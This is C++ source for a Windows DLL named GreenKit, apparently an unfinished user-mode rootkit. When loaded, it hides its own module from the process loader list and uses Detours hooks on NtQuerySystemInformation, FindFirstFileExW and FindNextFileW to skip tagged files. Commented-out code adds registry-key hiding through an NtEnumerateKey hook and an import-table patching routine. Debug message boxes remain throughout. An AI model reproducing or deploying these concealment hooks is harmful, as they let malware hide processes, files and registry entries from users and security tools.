/*#include "stdafx.h"
#include "windefs.h"
#include "hooking.h"

#include "NtQuerySystemInformation.h"
#include "NtEnumerateKey.h"
#include "FindFiles.h"*/

// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include <windows.h>
#include "Detours.h"
#include "el_win_structs.h"
//#include "NtEnumerateKey.h"

#include <shlwapi.h>
#include <winsock2.h>
#include "NtQuerySystemInformation.h"
#include "GreenKit.h"

#define REGKEY "SOFTWARE\\example\\example"
#define REGKEY_VALUE "explorer"
#define FILE_TAG "EXAMPLE"

VOID WriteFile(char token)
{
    HANDLE hFile = CreateFile("C:\\greenkit.txt",                // name of the write
        GENERIC_WRITE,          // open for writing
        0,                      // do not share
        NULL,                   // default security
        CREATE_NEW,             // create new file only
        FILE_ATTRIBUTE_NORMAL,  // normal file
        NULL);                  // no attr. template

    DWORD dwBytesWritten = 0;
    char Str[] = "hook regedit";
    WriteFile(hFile, Str + token, strlen(Str + token), &dwBytesWritten, NULL);
}

typedef DWORD(NTAPI *elNtQuerySystemInformation)(DWORD i, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
DWORD NTAPI elNtQuery(SYSTEM_INFORMATION_CLASS i, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);

typedef HANDLE(WINAPI *FFFEx)(wchar_t *lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData, FINDEX_SEARCH_OPS fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags);
HANDLE WINAPI elFFFEx(wchar_t *lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData, FINDEX_SEARCH_OPS fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags);

FFFEx oldFFFEx;
FFFEx hookFFFEx;

typedef BOOL(WINAPI *FNFW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
BOOL WINAPI elFNFW(HANDLE findfile, LPWIN32_FIND_DATAW finddata);

FNFW oldFNFW;
FNFW hookFNFW;

/* NT ENUMERATE KEY */

typedef NTSTATUS(WINAPI *TD_NtEnumerateKey)(HANDLE, ULONG, KEY_INFORMATION_CLASS, PVOID, ULONG, PULONG);

NTSTATUS NTAPI NewNtEnumerateKey(HANDLE, ULONG, KEY_INFORMATION_CLASS, PVOID, ULONG, PULONG);

typedef NTSTATUS(NTAPI *TD_NtOpenKey)(
    OUT PHANDLE  KeyHandle,
    IN ACCESS_MASK  DesiredAccess,
    IN POBJECT_ATTRIBUTES  ObjectAttributes
    );

TD_NtEnumerateKey oldNtEnumerateKey;
TD_NtEnumerateKey hookNtEnumerateKey;

typedef LONG (WINAPI *TD_RtlCompareUnicodeString)(
    _In_ PCUNICODE_STRING String1,
    _In_ PCUNICODE_STRING String2,
    _In_ BOOLEAN          CaseInSensitive
    );

typedef NTSTATUS(WINAPI * TD_RtlAnsiStringToUnicodeString)(
    _Inout_ PUNICODE_STRING DestinationString,
    _In_    PCANSI_STRING   SourceString,
    _In_    BOOLEAN         AllocateDestinationString
    );

typedef NTSTATUS(WINAPI * TD_RtlUniStringToAnsiString)(
    _Inout_ PCANSI_STRING DestinationString,
    _In_    PUNICODE_STRING   SourceString,
    _In_    BOOLEAN         AllocateDestinationString
    );

typedef VOID(NTAPI *TD_RtlFreeAnsiString)(
    PANSI_STRING AnsiString
);

typedef NTSTATUS(NTAPI *TD_NtClose)(
    IN HANDLE Handle
    );

typedef VOID(NTAPI *TD_FreeAnsiString)(
    PANSI_STRING AnsiString
    );

BOOL mustShiftReg(UNICODE_STRING uStr_reg) {
    UNICODE_STRING abc;
    ANSI_STRING ansi_abc;
    ansi_abc.Buffer = "greenkit";
    ansi_abc.Length = 8;
    ansi_abc.MaximumLength = 1024;
    TD_RtlAnsiStringToUnicodeString ansi_to_uni = (NTSTATUS(WINAPI *)
        (_Inout_ PUNICODE_STRING DestinationString, _In_ PCANSI_STRING SourceString,
        _In_ BOOLEAN AllocateDestinationString))GetProcAddress(GetModuleHandle("ntdll.dll"),
        "RtlAnsiStringToUnicodeString");

    ansi_to_uni(&abc, &ansi_abc, TRUE);

    TD_RtlCompareUnicodeString compare_uni = (LONG(WINAPI*)
        (_In_ PCUNICODE_STRING String1,
        _In_ PCUNICODE_STRING String2,
        _In_ BOOLEAN          CaseInSensitive
        ))GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlCompareUnicodeString");
    if (compare_uni(&abc, &uStr_reg, true) <= 0)
        return TRUE;
    return FALSE;
}

BOOL mustHideReg(UNICODE_STRING uStr_reg) {

    UNICODE_STRING abc;
    ANSI_STRING ansi_abc;
    ansi_abc.Buffer = "greenkit";
    ansi_abc.Length = 8;
    ansi_abc.MaximumLength = 1024;
    TD_RtlAnsiStringToUnicodeString ansi_to_uni = (NTSTATUS(WINAPI *)
        (_Inout_ PUNICODE_STRING DestinationString, _In_ PCANSI_STRING SourceString,
        _In_ BOOLEAN AllocateDestinationString))GetProcAddress(GetModuleHandle("ntdll.dll"),
        "RtlAnsiStringToUnicodeString");

    ansi_to_uni(&abc, &ansi_abc, TRUE);

    TD_RtlCompareUnicodeString compare_uni = (LONG(WINAPI*)
        (_In_ PCUNICODE_STRING String1,
        _In_ PCUNICODE_STRING String2,
        _In_ BOOLEAN          CaseInSensitive
        ))GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlCompareUnicodeString");

    if (compare_uni(&abc, &uStr_reg, true) == 0)
        return TRUE;
    return FALSE;
}

PVOID getKeyName(PVOID KeyInformation, KEY_INFORMATION_CLASS KeyInformationClass) {
    if (KeyInformationClass == KeyBasicInformation)
        return (PVOID)&(((PKEY_BASIC_INFORMATION)KeyInformation)->Name);
    else if (KeyInformationClass == KeyNodeInformation)
        return (PVOID)&(((PKEY_NODE_INFORMATION)KeyInformation)->Name);
    return NULL;
}

ULONG getKeyNameLength(PVOID KeyInformation, KEY_INFORMATION_CLASS KeyInformationClass) {
    if (KeyInformationClass == KeyBasicInformation)
        return ((PKEY_BASIC_INFORMATION)KeyInformation)->NameLength;
    else if (KeyInformationClass == KeyNodeInformation)
        return ((PKEY_NODE_INFORMATION)KeyInformation)->NameLength;
    return 0;
}

/* Return the name of the specified registrykey entry. */

PVOID getKeyEntryName(PVOID KeyInformation, KEY_INFORMATION_CLASS KeyInformationClass)
{
    PVOID pvResult = NULL;

    switch (KeyInformationClass)
    {
    case KeyBasicInformation:
        pvResult = (PVOID)&((PKEY_BASIC_INFORMATION)KeyInformation)->Name;
        break;
    case KeyNodeInformation:
        pvResult = (PVOID)&((PKEY_NODE_INFORMATION)KeyInformation)->Name;
        break;
    }

    return pvResult;
}

NTSTATUS WINAPI NewNtOpenFile(
    PHANDLE				phFile,
    ACCESS_MASK			DesiredAccess,
    POBJECT_ATTRIBUTES	ObjectAttributes,
    PIO_STATUS_BLOCK	IoStatusBlock,
    ULONG				ShareAccess,
    ULONG				OpenOptions)
{
    TCHAR sPath[MAX_PATH];
    //DWORD dwRet;
    //dwRet = GetFinalPathNameByHandle(*phFile, sPath, MAX_PATH, VOLUME_NAME_NONE);
    MessageBox(0, "NTDLL OPEN HOOOKED", "HookTest", MB_OK | MB_ICONERROR);

    //if (!mustHideFile(*sPath))
    //NTSTATUS status = ((PNT_OPEN_FILE) hooking_getOldFunction("NtOpenFile"))(phFile, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);

    return 0;//status; // STATUS_NO_SUCH_FILE
}

/*
NTSTATUS NTAPI NewNtEnumerateKey(
    HANDLE					KeyHandle,
    ULONG					Index,
    KEY_INFORMATION_CLASS	KeyInformationClass,
    PVOID					KeyInformation,
    ULONG					Length,
    PULONG					ResultLength)
{
    NTSTATUS ret;
    UNICODE_STRING uStr_tmp;
    UNICODE_STRING abc;
    ANSI_STRING ansi_abc;
    ansi_abc.Buffer = "greenkit";
    ansi_abc.Length = 8;
    ansi_abc.MaximumLength = 1024;
    TD_RtlAnsiStringToUnicodeString ansi_to_uni = (NTSTATUS(WINAPI *)
        (_Inout_ PUNICODE_STRING DestinationString, _In_ PCANSI_STRING SourceString,
        _In_ BOOLEAN AllocateDestinationString))GetProcAddress(GetModuleHandle("ntdll.dll"),
        "RtlAnsiStringToUnicodeString");

    ansi_to_uni(&abc, &ansi_abc, TRUE);

    ULONG tmpIndex = Index;
    ULONG tmpInt = 0;
    HANDLE h_tmp;
    OBJECT_ATTRIBUTES ObjectAttributes;

    if (KeyInformationClass == KeyBasicInformation || KeyInformationClass == KeyNodeInformation) {
        ret = hookNtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);
        if (NT_SUCCESS(ret)) {
            uStr_tmp.Buffer = (PWSTR)getKeyName(KeyInformation, KeyInformationClass);
            uStr_tmp.Length = (USHORT)getKeyNameLength(KeyInformation, KeyInformationClass);

            if (mustShiftReg(uStr_tmp)) { // TODO change this part for more than one key to hide {
                TD_NtOpenKey _NtOpenKey = (TD_NtOpenKey)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtOpenKey");
                NTSTATUS status;
                InitializeObjectAttributes(&ObjectAttributes, &abc, 0, KeyHandle, NULL);
                if (NT_SUCCESS(_NtOpenKey(&h_tmp, GENERIC_READ, &ObjectAttributes))) {
                    ++tmpIndex;
                    CloseHandle(h_tmp);
                }
            }

            if (tmpIndex != Index) {
                ret = hookNtEnumerateKey(KeyHandle, tmpIndex, KeyInformationClass, KeyInformation, Length, ResultLength);
                if (ret != STATUS_SUCCESS)
                    return ret;
                if (mustHideReg(uStr_tmp))
                    ++tmpIndex;
            }

            do {
                ret = hookNtEnumerateKey(KeyHandle, tmpIndex++, KeyInformationClass, KeyInformation, Length, ResultLength);
                if (ret != STATUS_SUCCESS)
                    return ret;
                if (!mustHideReg(uStr_tmp))
                    break;
                else
                    ++tmpInt;
            } while (TRUE);
        }
    }
    return hookNtEnumerateKey(KeyHandle, Index + tmpInt, KeyInformationClass, KeyInformation, Length, ResultLength);
}*/

	BOOL APIENTRY DllMain(HMODULE hModule,
		DWORD  ul_reason_for_call,
		LPVOID lpReserved
		)
	{
		PELPEB peb = EL_GetPeb();
		EL_HideModule(peb, L"GreenKit.dll");
		HMODULE NtDll = LoadLibrary("ntdll.dll");
		HMODULE Kernel32 = LoadLibrary("kernel32.dll");

		switch (ul_reason_for_call)
		{
		case DLL_PROCESS_ATTACH:
            SetOldHookNtQuery((TD_NtQuerySystemInformation)GetProcAddress(NtDll, "NtQuerySystemInformation"));
            SetHookNtQuery((TD_NtQuerySystemInformation)DetourFunction((PBYTE)GetOldHookNtQuery(), (PBYTE)NewNtQuerySystemInformation));

			oldFFFEx = (FFFEx)GetProcAddress(Kernel32, "FindFirstFileExW");
			hookFFFEx = (FFFEx)DetourFunction((PBYTE)oldFFFEx, (PBYTE)elFFFEx);

			oldFNFW = (FNFW)GetProcAddress(Kernel32, "FindNextFileW");
			hookFNFW = (FNFW)DetourFunction((PBYTE)oldFNFW, (PBYTE)elFNFW);

			//oldNtEnumerateKey = (TD_NtEnumerateKey)GetProcAddress(NtDll, "NtEnumerateKey");
			//hookNtEnumerateKey = (TD_NtEnumerateKey)DetourFunction((PBYTE)oldNtEnumerateKey, (PBYTE)NewNtEnumerateKey);

		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
		}
		return TRUE;
	}

	HANDLE WINAPI elFFFEx(wchar_t *lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData, FINDEX_SEARCH_OPS fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags)
	{
		HANDLE ret = hookFFFEx(lpFileName, fInfoLevelId, lpFindFileData, fSearchOp, lpSearchFilter, dwAdditionalFlags);
		MessageBox(0, "EXPLORER HOOKED", "HookTest", MB_OK | MB_ICONERROR);
		if (ret)
		{
			WIN32_FIND_DATAW *f = (WIN32_FIND_DATAW *)lpFindFileData;

			HANDLE std = GetStdHandle(STD_OUTPUT_HANDLE);

			char name[512];

			WideCharToMultiByte(CP_ACP, 0, f->cFileName, -1, name, 512, NULL, NULL);

			char exe[128];

			HKEY key;
			DWORD size;

			RegOpenKey(HKEY_LOCAL_MACHINE, REGKEY, &key);

			RegQueryValueEx(key, REGKEY_VALUE, NULL, NULL, (BYTE *)exe, &size);

			RegCloseKey(key);

			if (strstr(name, FILE_TAG) != 0)
			{
				hookFNFW(ret, (WIN32_FIND_DATAW *)lpFindFileData);
			}
		}

		return ret;
	}

	void path_strip_filename2(TCHAR *Path) {
		size_t Len = _tcslen(Path);
		if (Len == 0) { return; };
		size_t Idx = Len - 1;
		while (TRUE) {
			TCHAR Chr = Path[Idx];
			if (Chr == TEXT('\\') || Chr == TEXT('/')) {
				if (Idx == 0 || Path[Idx - 1] == ':') { Idx++; };
				break;
			}
			else if (Chr == TEXT(':')) {
				Idx++; break;
			}
			else {
				if (Idx == 0) { break; }
				else { Idx--; };
			};
		};
		Path[Idx] = TEXT('\0');
	};

	BOOL WINAPI elFNFW(HANDLE findfile, LPWIN32_FIND_DATAW finddata)
	{
		//BOOL ret = hookFNFW(findfile, finddata);
		/*
		if (ret)
		{
		WIN32_FIND_DATAW *f = (WIN32_FIND_DATAW *)finddata;

		char name[512] = "";

		WideCharToMultiByte(CP_ACP, 0, f->cFileName, -1, name, 512, NULL, NULL);

		char exe[128] = "";

		HKEY key;
		DWORD size;

		RegOpenKey(HKEY_LOCAL_MACHINE, REGKEY, &key);

		RegQueryValueEx(key, REGKEY_VALUE, NULL, NULL, (BYTE *)exe, &size);

		RegCloseKey(key);

		if (strcmp(name, "EXAMPLE.txt") == 0 || isPartOf(name, "a"))
		{
		MessageBox(0, "FOUND", "HookTest", MB_OK | MB_ICONERROR);
		hookFNFW(findfile, (WIN32_FIND_DATAW *)finddata);
		}
		}

		return ret;
		*/
		//MessageBox(0, "HOOKED FW", "HookTest", MB_OK | MB_ICONERROR);
		WIN32_FIND_DATAW *f = (WIN32_FIND_DATAW *)finddata;

		char name[512] = "";

		WideCharToMultiByte(CP_ACP, 0, f->cFileName, -1, name, 512, NULL, NULL);
		char szBuffer[MAX_PATH] = "\0", szFileName[MAX_PATH];
		WideCharToMultiByte(CP_ACP, 0, finddata->cFileName, MAX_PATH, szFileName, MAX_PATH, NULL, NULL);
		path_strip_filename2(szFileName);
		memcpy(szBuffer, szFileName, 6);
		BOOL ret = hookFNFW(findfile, (WIN32_FIND_DATAW *)finddata);
		if (lstrcmpi(name, "a") == 0 || strcmp(name, "test.txt") == 0)
		{
			MessageBox(0, "FOUND", "HookTest", MB_OK | MB_ICONERROR);
			ret = hookFNFW(findfile, (WIN32_FIND_DATAW *)finddata);
		}
		return ret;
	}

	// OLD
	/*
	VOID WriteFile()
	{
	HANDLE hFile = CreateFile("C:\\greenkit.txt",                // name of the write
	GENERIC_WRITE,          // open for writing
	0,                      // do not share
	NULL,                   // default security
	CREATE_NEW,             // create new file only
	FILE_ATTRIBUTE_NORMAL,  // normal file
	NULL);                  // no attr. template

	DWORD dwBytesWritten = 0;
	char Str[] = "Coucou";
	WriteFile(hFile, Str, strlen(Str), &dwBytesWritten, NULL);
	}

	BOOL mustHideFile(TCHAR filePath) {
	return FALSE; // TODO check la fin de la string avec des constantes
	}

	NTSTATUS WINAPI NewNtOpenFile(
	PHANDLE				phFile,
	ACCESS_MASK			DesiredAccess,
	POBJECT_ATTRIBUTES	ObjectAttributes,
	PIO_STATUS_BLOCK	IoStatusBlock,
	ULONG				ShareAccess,
	ULONG				OpenOptions)
	{
	TCHAR sPath[MAX_PATH];
	//DWORD dwRet;
	//dwRet = GetFinalPathNameByHandle(*phFile, sPath, MAX_PATH, VOLUME_NAME_NONE);
	MessageBox(0, "NTDLL OPEN HOOOKED", "HookTest", MB_OK | MB_ICONERROR);
	WriteFile();
	//if (!mustHideFile(*sPath))
	//NTSTATUS status = ((PNT_OPEN_FILE) hooking_getOldFunction("NtOpenFile"))(phFile, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);

	return 0;//status; // STATUS_NO_SUCH_FILE
	}

	NTSTATUS WINAPI NewNtCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes,
	PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes,
	ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength)
	{
	//TCHAR sPath[MAX_PATH];
	//DWORD dwRet;
	//dwRet = GetFinalPathNameByHandle(*phFile, sPath, MAX_PATH, VOLUME_NAME_NONE);
	MessageBox(0, "NTDLL CREATE HOOOKED", "HookTest", MB_OK | MB_ICONERROR);
	//if (!mustHideFile(*sPath))
	NTSTATUS status = ((PNT_CREATE_FILE) hooking_getOldFunction("NtCreateFile"))(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition,
	CreateOptions, EaBuffer, EaLength);

	return status; // STATUS_NO_SUCH_FILE
	}

	void *Hook(char *szDllName, char *szFunctionName, void *pNewFunction)
	{
	#define MakePtr(cast, ptr, addValue)(cast)((DWORD)(ptr) + (DWORD)(addValue))
	DWORD dwOldProtect, dwOldProtect2;
	HMODULE hModule = GetModuleHandle(NULL);
	PIMAGE_DOS_HEADER pDosHeader;
	PIMAGE_NT_HEADERS pNTHeader;
	PIMAGE_IMPORT_DESCRIPTOR pImportDesc;
	PIMAGE_THUNK_DATA pThunk;
	void *pOldFunction;
	if (!(pOldFunction = GetProcAddress(GetModuleHandle(szDllName), szFunctionName))) return 0;
	pDosHeader = (PIMAGE_DOS_HEADER)hModule;
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return (NULL);
	pNTHeader = MakePtr(PIMAGE_NT_HEADERS, pDosHeader, pDosHeader->e_lfanew);
	if (pNTHeader->Signature != IMAGE_NT_SIGNATURE || (pImportDesc = MakePtr(PIMAGE_IMPORT_DESCRIPTOR, pDosHeader, pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress)) == (PIMAGE_IMPORT_DESCRIPTOR)pNTHeader) return (NULL);
	while (pImportDesc->Name)
	{
	char *szModuleName = MakePtr(char *, pDosHeader, pImportDesc->Name);
	if (!stricmp(szModuleName, szDllName)) break;
	pImportDesc++;
	}
	if (pImportDesc->Name == NULL) return (NULL);
	pThunk = MakePtr(PIMAGE_THUNK_DATA, pDosHeader, pImportDesc->FirstThunk);
	while (pThunk->u1.Function)
	{
	if (pThunk->u1.Function == (DWORD)pOldFunction)
	{
	VirtualProtect((void *)&pThunk->u1.Function, sizeof(DWORD), PAGE_EXECUTE_READWRITE, &dwOldProtect);
	pThunk->u1.Function = (DWORD)pNewFunction;
	VirtualProtect((void *)&pThunk->u1.Function, sizeof(DWORD), dwOldProtect, &dwOldProtect2);
	return (pOldFunction);
	}
	pThunk++;
	}
	return (NULL);
	}

	bool WINAPI DllMain(HANDLE hModule, DWORD dwReason, LPVOID lpReserved)
	{
	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
	MessageBox(0, "HOOKED", "HookTest", MB_OK | MB_ICONERROR);
	hooking_addFunction("NtQuerySystemInformation", Hook("NTDLL.DLL", "NtQuerySystemInformation", NewNtQuerySystemInformation));
	hooking_addFunction("NtOpenFile", Hook("NTDLL.DLL", "NtOpenFile", NewNtOpenFile));
	hooking_addFunction("NtEnumerateKey", Hook("NTDLL.DLL", "NtEnumerateKey", NewNtEnumerateKey));
	hooking_addFunction("FindFirstFileA", Hook("KERNEL32.DLL", "FindFirstFileA", MyFindFirstFileA));
	hooking_addFunction("FindNextFileA", Hook("KERNEL32.DLL", "FindNextFileA", MyFindNextFileA));
	hooking_addFunction("FindFirstFileW", Hook("KERNEL32.DLL", "FindFirstFileW", MyFindFirstFileW));
	hooking_addFunction("FindNextFileW", Hook("KERNEL32.DLL", "FindNextFileW", MyFindNextFileW));
	return TRUE;
	}
	return TRUE;
	}*/